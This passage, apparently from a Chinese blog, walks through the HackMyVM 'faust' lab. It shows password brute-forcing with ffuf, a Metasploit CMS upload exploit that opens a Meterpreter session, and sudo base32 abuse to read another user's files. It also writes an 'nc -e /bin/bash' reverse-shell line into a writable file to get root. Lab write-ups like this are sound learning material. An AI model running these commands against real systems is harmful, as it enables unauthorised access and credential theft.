<span class="number">0</span>]</span><br><span class="line">/tmp                  (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">314</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.138</span>/<span class="type">tmp</span>/]</span><br><span class="line">/.php                 (Status: <span class="number">403</span>) [<span class="type">Size</span>: <span class="number">279</span>]</span><br><span class="line">/.html                (Status: <span class="number">403</span>) [<span class="type">Size</span>: <span class="number">279</span>]</span><br><span class="line">/server<span class="literal">-status</span>        (Status: <span class="number">403</span>) [<span class="type">Size</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/../pic/image-20230730165020459.png" alt="image-20230730165020459"></p>
-<p>burpsuite抓包爆破</p>
-<p>那么根据网站尝试生成一个字典跑一下</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>/桌面]</span><br><span class="line">└─<span class="comment"># cewl -d 2  -with-numbers -m 4 http://192.168.56.138/index.php -w dict.txt</span></span><br><span class="line"></span><br><span class="line">CeWL <span class="number">5.5</span>.<span class="number">2</span> (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br></pre></td></tr></table></figure>
-
-<p>burpsuite爆破</p>
-<p><img src="/../pic/image-20230730165800603.png" alt="image-20230730165800603"></p>
-<p>fuzz爆破</p>
-<p>用rockyou.txt</p>
-<p>burpsuite跑不动</p>
-<p>跑炸了</p>
-<p>换个字典</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># ffuf -u &quot;http://192.168.56.138/admin/login.php&quot; \ </span></span><br><span class="line"> <span class="literal">-X</span> POST <span class="literal">-H</span> <span class="string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> \    </span><br><span class="line"> <span class="literal">-d</span> <span class="string">&quot;username=admin&amp;password=FUZZ&amp;loginsubmit=%E6%8F%90%E4%BA%A4&quot;</span> \</span><br><span class="line"> <span class="literal">-w</span> /usr/share/wordlists/seclists/Passwords/xato<span class="literal">-net-10-million-passwords-10000</span>.txt <span class="literal">-mc</span> <span class="number">302</span></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.0.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : POST</span></span><br><span class="line"><span class="string"> :: URL              : http://192.168.56.138/admin/login.php</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string"> :: Data             : username=admin&amp;password=FUZZ&amp;loginsubmit=%E6%8F%90%E4%BA%A4</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 302</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 20ms]</span></span><br><span class="line"><span class="string">    * FUZZ: bullshit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">:: Progress: [10000/10000] :: Job [1/1] :: 324 req/sec :: Duration: [0:00:34] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>
-
-<p>用msf试试(注：设置同一个网卡)</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/http/cmsms_upload_rename_rce) &gt; <span class="built_in">set</span> username admin</span><br><span class="line">username =&gt; admin</span><br><span class="line">msf6 exploit(multi/http/cmsms_upload_rename_rce) &gt; <span class="built_in">set</span> password bullshit</span><br><span class="line">password =&gt; bullshit</span><br><span class="line">msf6 exploit(multi/http/cmsms_upload_rename_rce) &gt; <span class="built_in">set</span> targeturi /</span><br><span class="line">targeturi =&gt; /</span><br><span class="line">msf6 exploit(multi/http/cmsms_upload_rename_rce) &gt; <span class="built_in">set</span> rhosts <span class="number">192.168</span>.<span class="number">56.138</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">56.138</span></span><br><span class="line">msf6 exploit(multi/http/cmsms_upload_rename_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span>.<span class="number">181.139</span>:<span class="number">4444</span> </span><br><span class="line">[*] Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to disable)</span><br><span class="line">[+] The target appears to be vulnerable.</span><br><span class="line">[!] This exploit may require manual cleanup of <span class="string">&#x27;kMhoUSjV.txt&#x27;</span> on the target</span><br><span class="line">[!] This exploit may require manual cleanup of <span class="string">&#x27;kMhoUSjV.php&#x27;</span> on the target</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf6 exploit(multi/http/cmsms_upload_rename_rce) &gt; <span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">msf6 exploit(multi/http/cmsms_upload_rename_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span>.<span class="number">56.127</span>:<span class="number">4444</span> </span><br><span class="line">[*] Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to disable)</span><br><span class="line">[+] The target appears to be vulnerable.</span><br><span class="line">[*] Sending stage (<span class="number">39927</span> bytes) to <span class="number">192.168</span>.<span class="number">56.138</span></span><br><span class="line">[+] Deleted nZmkekLBlqD.txt</span><br><span class="line">[+] Deleted nZmkekLBlqD.php</span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span>.<span class="number">56.127</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span>.<span class="number">56.138</span>:<span class="number">44910</span>) at <span class="number">2023</span><span class="literal">-07-30</span> <span class="number">17</span>:<span class="number">54</span>:<span class="number">58</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nc -lvnp 8888                   </span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">8888</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.56.127</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.56.138</span>] <span class="number">54744</span></span><br><span class="line">python3 <span class="literal">-c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">www<span class="literal">-data</span>@debian:/var/www/html/uploads<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">DJLyyxtACv.php  KstZChBgtC.php  fEFiROwR.txt  kMhoUSjV.txt     soFxiwbFZHp.txt</span><br><span class="line">DJLyyxtACv.txt  KstZChBgtC.txt  images        ngrey</span><br><span class="line">KZvdsAvK.php    NCleanBlue      index.html    simplex</span><br><span class="line">KZvdsAvK.txt    fEFiROwR.php    kMhoUSjV.php  soFxiwbFZHp.php</span><br><span class="line">www<span class="literal">-data</span>@debian:/var/www/html/uploads<span class="variable">$</span> <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">www<span class="literal">-data</span>@debian:/var/www/html<span class="variable">$</span> <span class="built_in">cat</span> /etc/passwd | grep /bin/bash</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep /bin/bash</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br><span class="line">paul:x:<span class="number">1001</span>:<span class="number">1001</span>:,,,:/home/paul:/bin/bash</span><br><span class="line">nico:x:<span class="number">1000</span>:<span class="number">1000</span>:,,,:/home/nico:/bin/bash</span><br><span class="line">www<span class="literal">-data</span>@debian:/var/www/html<span class="variable">$</span> <span class="built_in">rm</span> <span class="literal">-rf</span> ./*</span><br><span class="line"><span class="built_in">rm</span> <span class="literal">-rf</span> ./*</span><br><span class="line">www<span class="literal">-data</span>@debian:/var/www/html<span class="variable">$</span> <span class="built_in">cd</span> /home/paul</span><br><span class="line"><span class="built_in">cd</span> /home/paul</span><br><span class="line">www<span class="literal">-data</span>@debian:/home/paul<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">password.txt</span><br><span class="line">www<span class="literal">-data</span>@debian:/home/paul<span class="variable">$</span> <span class="built_in">cat</span> password.txt    </span><br><span class="line"><span class="built_in">cat</span> password.txt</span><br><span class="line">Password is: YouCanBecomePaul</span><br><span class="line">www<span class="literal">-data</span>@debian:/home/paul<span class="variable">$</span> </span><br></pre></td></tr></table></figure>
-
-<p>ssh连接一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/ace]</span><br><span class="line">└─# ssh paul@192.168.56.138                                            </span><br><span class="line">The authenticity of host &#x27;192.168.56.138 (192.168.56.138)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:lceOIwdNewht9GK+znSKUwdNJEHgPsE9TvClQ1KEELA.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.56.138&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">paul@192.168.56.138&#x27;s password: </span><br><span class="line">Linux debian 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Fri Apr  2 09:49:06 2021 from 192.168.0.25</span><br><span class="line">paul@debian:~$ ls</span><br><span class="line">password.txt</span><br><span class="line">paul@debian:~$ </span><br></pre></td></tr></table></figure>
-
-<p>paul连接成功了，但是我们更需要nico</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">paul@debian:~<span class="variable">$</span> sudo <span class="literal">-l</span></span><br><span class="line">[<span class="type">sudo</span>] Mot de passe de paul : </span><br><span class="line">Entrées par défaut pour paul sur debian :</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">L<span class="string">&#x27;utilisateur paul peut utiliser les commandes suivantes sur debian :</span></span><br><span class="line"><span class="string">    (nico) /usr/bin/base32</span></span><br><span class="line"><span class="string">paul@debian:~$ ls -al /home/nico</span></span><br><span class="line"><span class="string">total 32</span></span><br><span class="line"><span class="string">drwxr-xr-x 3 nico nico 4096 avril  1  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 4 root root 4096 avril  1  2021 ..</span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root    9 avril  1  2021 .bash_history -&gt; /dev/null</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 nico nico  220 avril  1  2021 .bash_logout</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 nico nico 3526 avril  1  2021 .bashrc</span></span><br><span class="line"><span class="string">drwxr-xr-x 3 nico nico 4096 avril  1  2021 .local</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 nico nico  807 avril  1  2021 .profile</span></span><br><span class="line"><span class="string">-rwx------ 1 nico nico   37 avril  1  2021 .secret.txt</span></span><br><span class="line"><span class="string">-rwx------ 1 nico nico   11 avril  1  2021 user.txt</span></span><br><span class="line"><span class="string">paul@debian:~$ sudo -u nico /usr/bin/base32 /home/nico/user.txt</span></span><br><span class="line"><span class="string">M5QW22DBNZQXE2DVBI======</span></span><br><span class="line"><span class="string">paul@debian:~$ echo &quot;M5QW22DBNZQXE2DVBI======&quot; |base32 d</span></span><br><span class="line"><span class="string">base32: d: Aucun fichier ou dossier de ce type</span></span><br><span class="line"><span class="string">paul@debian:~$ echo &quot;M5QW22DBNZQXE2DVBI======&quot; |base32 -d</span></span><br><span class="line"><span class="string">gamhanarhu</span></span><br><span class="line"><span class="string">paul@debian:~$ </span></span><br></pre></td></tr></table></figure>
-
-<p>┗|｀O′|┛ 嗷~~！！！</p>
-<h2 id="5-sudo提权"><a href="#5-sudo提权" class="headerlink" title="5.sudo提权"></a>5.sudo提权</h2><p>在根目录nico中有张照片，nico密码：just_one_more_beer</p>
-<p>scp下载看一下</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># scp nico@192.168.56.138:/nico/homer.jpg  /home/ace/桌面 </span></span><br><span class="line">nico@<span class="number">192.168</span>.<span class="number">56.138</span><span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">homer.jpg                                                                                                       100%   46KB   2.1MB/s   00:00    </span></span><br><span class="line"><span class="string">             </span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/../pic/image-20230730184807502.png" alt="image-20230730184807502"></p>
-<p>homer!!!!!</p>
-<p>隐写瞧一下</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>/桌面]</span><br><span class="line">└─<span class="comment"># stegseek homer.jpg /usr/share/wordlists/rockyou.txt</span></span><br><span class="line">StegSeek <span class="number">0.6</span> - https://github.com/RickdeJager/StegSeek</span><br><span class="line"></span><br><span class="line">[<span class="type">i</span>] Found passphrase: <span class="string">&quot;&quot;</span></span><br><span class="line">[<span class="type">i</span>] Original filename: <span class="string">&quot;note.txt&quot;</span>.</span><br><span class="line">[<span class="type">i</span>] Extracting to <span class="string">&quot;homer.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>/桌面]</span><br><span class="line">└─<span class="comment"># cat homer.jpg.out </span></span><br><span class="line">my /tmp/goodgame file was so good... but I lost it </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>发现&#x2F;tmp&#x2F;goodgame这里有漏洞，可以试试看</p>
-<p>写个反弹shell吧</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nico@debian:/tmp<span class="variable">$</span> <span class="built_in">echo</span> <span class="string">&quot;nc -e /bin/bash 192.168.56.127 8888&quot;</span> &gt;goodgame</span><br><span class="line">nico@debian:/tmp<span class="variable">$</span> chmod +x goodgame</span><br><span class="line">nico@debian:/tmp<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line">goodgame</span><br><span class="line">systemd<span class="literal">-private-ad04a55cc7794aecabcc0313ed54c41b-apache2</span>.service<span class="literal">-T943wT</span></span><br><span class="line">systemd<span class="literal">-private-ad04a55cc7794aecabcc0313ed54c41b-systemd-timesyncd</span>.service<span class="literal">-7nEvtU</span></span><br><span class="line">nico@debian:/tmp<span class="variable">$</span> <span class="built_in">ls</span> <span class="literal">-al</span></span><br><span class="line">total <span class="number">40</span></span><br><span class="line">drwxrwxrwt  <span class="number">9</span> root root <span class="number">4096</span> juil. <span class="number">30</span> <span class="number">13</span>:<span class="number">24</span> .</span><br><span class="line">drwxr<span class="literal">-xr-x</span> <span class="number">19</span> root root <span class="number">4096</span> avril  <span class="number">1</span>  <span class="number">2021</span> ..</span><br><span class="line">drwxrwxrwt  <span class="number">2</span> root root <span class="number">4096</span> juil. <span class="number">30</span> <span class="number">10</span>:<span class="number">05</span> .font<span class="literal">-unix</span></span><br><span class="line"><span class="literal">-rwxr-xr-x</span>  <span class="number">1</span> nico nico   <span class="number">36</span> juil. <span class="number">30</span> <span class="number">13</span>:<span class="number">24</span> goodgame</span><br><span class="line">drwxrwxrwt  <span class="number">2</span> root root <span class="number">4096</span> juil. <span class="number">30</span> <span class="number">10</span>:<span class="number">05</span> .ICE<span class="literal">-unix</span></span><br><span class="line">drwx<span class="literal">------</span>  <span class="number">3</span> root root <span class="number">4096</span> juil. <span class="number">30</span> <span class="number">10</span>:<span class="number">05</span> systemd<span class="literal">-private-ad04a55cc7794aecabcc0313ed54c41b-apache2</span>.service<span class="literal">-T943wT</span></span><br><span class="line">drwx<span class="literal">------</span>  <span class="number">3</span> root root <span class="number">4096</span> juil. <span class="number">30</span> <span class="number">10</span>:<span class="number">05</span> systemd<span class="literal">-private-ad04a55cc7794aecabcc0313ed54c41b-systemd-timesyncd</span>.service<span class="literal">-7nEvtU</span></span><br><span class="line">drwxrwxrwt  <span class="number">2</span> root root <span class="number">4096</span> juil. <span class="number">30</span> <span class="number">10</span>:<span class="number">05</span> .<span class="built_in">Test-unix</span></span><br><span class="line">drwxrwxrwt  <span class="number">2</span> root root <span class="number">4096</span> juil. <span class="number">30</span> <span class="number">10</span>:<span class="number">05</span> .X11<span class="literal">-unix</span></span><br><span class="line">drwxrwxrwt  <span class="number">2</span> root root <span class="number">4096</span> juil. <span class="number">30</span> <span class="number">10</span>:<span class="number">05</span> .XIM<span class="literal">-unix</span></span><br><span class="line">nico@debian:/tmp<span class="variable">$</span> <span class="built_in">cat</span> goodgame</span><br><span class="line">nc <span class="literal">-e</span> /bin/bash <span class="number">192.168</span>.<span class="number">56.127</span> <span class="number">8888</span></span><br><span class="line">nico@debian:/tmp<span class="variable">$</span> </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nc -lvnp 8888                   </span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">8888</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.56.127</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.56.138</span>] <span class="number">54748</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">root.txt</span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">lasarnsilgam                     </span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/07/30/faust/" data-id="clmnr8k070008so8g6389h0sv" data-title="faust" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/msf/" rel="tag">msf</a></li></ul>
-
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2023/08/02/pickle-rick/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          pickle-rick
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2023/07/29/warrior/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">warrior</div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/hack-the-box/">hack the box</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/home/">home</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux%E5%AD%A6%E4%B9%A0/">linux学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/burp-suite/" rel="tag">burp suite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chown/" rel="tag">chown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/find/" rel="tag">find</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ftp/" rel="tag">ftp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gittools/" rel="tag">gittools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/home/" rel="tag">home</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hydra/" rel="tag">hydra</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E6%8F%90%E6%9D%83/" rel="tag">linux提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf/" rel="tag">msf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msfs/" rel="tag">msfs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nmap/" rel="tag">nmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pspy/" rel="tag">pspy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellinabox/" rel="tag">shellinabox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/" rel="tag">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/talnet/" rel="tag">talnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tryhackme/" rel="tag">tryhackme</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webshell/" rel="tag">webshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%86%E7%A0%B4/" rel="tag">爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F/" rel="tag">目录渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" rel="tag">目录遍历</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81/" rel="tag">路径劫持</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/burp-suite/" style="font-size: 10px;">burp suite</a> <a href="/tags/chown/" style="font-size: 10px;">chown</a> <a href="/tags/find/" style="font-size: 10px;">find</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/fuzz/" style="font-size: 12.5px;">fuzz</a> <a href="/tags/gittools/" style="font-size: 10px;">gittools</a> <a href="/tags/hackmyvm/" style="font-size: 20px;">hackmyvm</a> <a href="/tags/home/" style="font-size: 10px;">home</a> <a href="/tags/hydra/" style="font-size: 10px;">hydra</a> <a href="/tags/linux%E6%8F%90%E6%9D%83/" style="font-size: 10px;">linux提权</a> <a href="/tags/msf/" style="font-size: 12.5px;">msf</a> <a href="/tags/msfs/" style="font-size: 10px;">msfs</a> <a href="/tags/nmap/" style="font-size: 10px;">nmap</a> <a href="/tags/pspy/" style="font-size: 10px;">pspy</a> <a href="/tags/shellinabox/" style="font-size: 10px;">shellinabox</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/talnet/" style="font-size: 10px;">talnet</a> <a href="/tags/tryhackme/" style="font-size: 17.5px;">tryhackme</a> <a href="/tags/webshell/" style="font-size: 15px;">webshell</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F/" style="font-size: 10px;">目录渗透</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" style="font-size: 12.5px;">目录遍历</a> <a 